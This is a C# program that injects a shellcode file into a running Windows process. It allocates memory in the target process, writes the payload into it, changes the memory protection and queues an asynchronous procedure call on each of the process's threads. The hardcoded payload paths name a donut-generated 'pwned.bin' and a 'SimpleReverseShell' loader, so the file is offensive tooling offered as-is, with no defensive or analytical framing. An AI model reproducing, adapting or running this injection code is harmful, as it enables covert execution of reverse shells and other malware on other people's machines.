using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace DotNetQueueUserAPCInjectionOnExit
{
    class Program
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public Int32 cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public Int32 dwX;
			public Int32 dwY;
			public Int32 dwXSize;
			public Int32 dwYSize;
			public Int32 dwXCountChars;
			public Int32 dwYCountChars;
			public Int32 dwFillAttribute;
			public Int32 dwFlags;
			public Int16 wShowWindow;
			public Int16 cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
			/// <summary>
			/// A handle to the newly created process. 
			/// The handle is used to specify the process in all functions that perform operations on the process object.
			/// </summary>
			public IntPtr hProcess;

			/// <summary>
			/// A handle to the primary thread of the newly created process. 
			/// The handle is used to specify the thread in all functions that perform operations on the thread object.
			/// </summary>
			public IntPtr hThread;


			public int dwProcessId;
			public int dwThreadId;
		}



		[DllImport("kernel32")]
		public static extern IntPtr VirtualAlloc(int lpAddress, int dwSize, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();
		[DllImport("kernel32.dll")]
		private static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);

		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool CreateProcess(
				   string lpApplicationName,
				   string lpCommandLine,
				   int lpProcessAttributes,
				   int lpThreadAttributes,
				   bool bInheritHandles,
				   uint dwCreationFlags,
				   int lpEnvironment,
				   string lpCurrentDirectory,
				   ref STARTUPINFO lpStartupInfo,
				   ref PROCESS_INFORMATION lpProcessInformation);

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
			int dwSize, int flAllocationType, int flProtect);

		[DllImport("kernel32.dll")]
		public static extern bool WriteProcessMemory(
									 IntPtr hProcess,
									 IntPtr lpBaseAddress,
									 byte[] lpBuffer,
									 int nSize,
									 out IntPtr lpNumberOfBytesWritten
								);
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, int dwThreadId);

		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

		static void Main(string[] args)
        {
			string path2 = @"D:\Users\Razali\Source\Repos\donut\pwned.bin";
			path2 = @"C:\Users\Razali\source\repos\SimpleReverseShell\SimpleReverseShell\bin\x64\Debug\loader.bin";
			//string path = @"C:\Users\Razali\source\repos\jsutdelete\helloworldwinform\bin\Release\helloworldwinform.exe";
			string path = @"C:\Users\Razali\source\repos\jsutdelete\ConsoleApp1\bin\Release\ConsoleApp1.exe";
			byte[] sc = File.ReadAllBytes(path2);

			Process process1 = Process.GetProcessesByName("ConsoleApp1")[0];
			IntPtr resultPtr = VirtualAllocEx(process1.Handle, IntPtr.Zero, sc.Length, 0x00001000, 0x40);
			IntPtr bytesWritten = IntPtr.Zero;
			bool resultBool = WriteProcessMemory(process1.Handle, resultPtr, sc, sc.Length, out bytesWritten);
			foreach (ProcessThread thread in process1.Threads)
			{
				IntPtr sht = OpenThread(0x0010, false, thread.Id);
				resultBool = VirtualProtectEx(process1.Handle, resultPtr, sc.Length, 0x20, out _);
				uint ptr = QueueUserAPC(resultPtr, sht, 0);

			}
		}
    }
}
